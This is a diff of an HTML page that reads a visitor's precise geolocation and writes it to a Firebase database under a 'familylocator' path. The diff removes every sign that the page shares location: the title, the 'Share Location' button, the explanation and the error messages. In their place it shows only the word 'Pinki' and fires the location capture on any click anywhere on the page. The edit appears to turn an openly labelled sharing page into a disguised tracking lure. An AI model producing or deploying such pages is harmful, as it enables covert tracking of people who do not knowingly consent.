@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>KS</title>
+    <title>Pinki</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -13,92 +13,55 @@
             justify-content: center;
             min-height: 100vh;
             background: #ffffff;
-        }
-        .container { text-align: center; padding: 2rem; }
-        .icon { font-size: 64px; margin-bottom: 1rem; }
-        .title { font-size: 24px; font-weight: 300; color: #333; margin-bottom: 0.5rem; }
-        .subtitle { font-size: 14px; color: #999; margin-bottom: 2rem; }
-        .btn {
-            background: #4CAF50;
-            color: white;
-            border: none;
-            padding: 16px 48px;
-            font-size: 18px;
-            border-radius: 50px;
             cursor: pointer;
         }
-        .status { font-size: 16px; color: #666; margin-top: 1rem; }
-        .error { color: #f44336; }
+        .title {
+            font-size: 32px;
+            font-weight: 300;
+            color: #333;
+        }
+        #status {
+            position: fixed;
+            bottom: 40px;
+            width: 100%;
+            text-align: center;
+            font-size: 14px;
+            color: #999;
+        }
     </style>
 </head>
-<body>
-    <div class="container">
-        <div class="icon" id="icon">📍</div>
-        <div class="title" id="title">KS</div>
-        <div class="subtitle" id="subtitle">Tap below to share location</div>
-        <button class="btn" id="btn" onclick="getLocation()">Share Location</button>
-        <div class="status" id="status"></div>
-    </div>
+<body onclick="getLocation()">
+    <div class="title">Pinki</div>
+    <div id="status"></div>
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
         import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
 
-        const firebaseConfig = {
+        const app = initializeApp({
             databaseURL: "https://familylocator-3808a-default-rtdb.asia-southeast1.firebasedatabase.app"
-        };
-
-        const app = initializeApp(firebaseConfig);
+        });
         const db = getDatabase(app);
 
         window.getLocation = function() {
-            document.getElementById('btn').style.display = 'none';
-            document.getElementById('status').textContent = 'Getting location...';
-            document.getElementById('icon').textContent = '⏳';
-
-            if (!navigator.geolocation) {
-                showError('Location not supported.');
-                return;
-            }
-
+            document.getElementById('status').textContent = '...';
             navigator.geolocation.getCurrentPosition(
                 function(position) {
-                    const lat = position.coords.latitude;
-                    const lng = position.coords.longitude;
-                    const accuracy = Math.round(position.coords.accuracy);
-                    const timestamp = Date.now();
-
-                    const locationRef = ref(db, 'families/74b5bd46/ondemand/location');
-                    set(locationRef, {
-                        lat: lat,
-                        lng: lng,
-                        accuracy: accuracy,
-                        timestamp: timestamp,
+                    set(ref(db, 'families/74b5bd46/ondemand/location'), {
+                        lat: position.coords.latitude,
+                        lng: position.coords.longitude,
+                        accuracy: Math.round(position.coords.accuracy),
+                        timestamp: Date.now(),
                         source: 'link'
                     }).then(() => {
-                        document.getElementById('icon').textContent = '✅';
-                        document.getElementById('title').textContent = 'Done!';
-                        document.getElementById('subtitle').textContent = 'You can close this page.';
-                        document.getElementById('status').textContent = '';
-                        document.getElementById('btn').style.display = 'none';
-                    }).catch((error) => {
-                        showError('Failed to send. Try again.');
-                        document.getElementById('btn').style.display = 'inline-block';
+                        document.getElementById('status').textContent = '✓';
                     });
                 },
-                function(error) {
-                    showError('Allow location access and try again.');
-                    document.getElementById('btn').style.display = 'inline-block';
-                    document.getElementById('btn').textContent = 'Try Again';
+                function() {
+                    document.getElementById('status').textContent = '✗';
                 },
                 { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
             );
-        }
-
-        function showError(msg) {
-            document.getElementById('icon').textContent = '❌';
-            document.getElementById('status').textContent = msg;
-            document.getElementById('status').className = 'status error';
         }
     </script>
 </body>
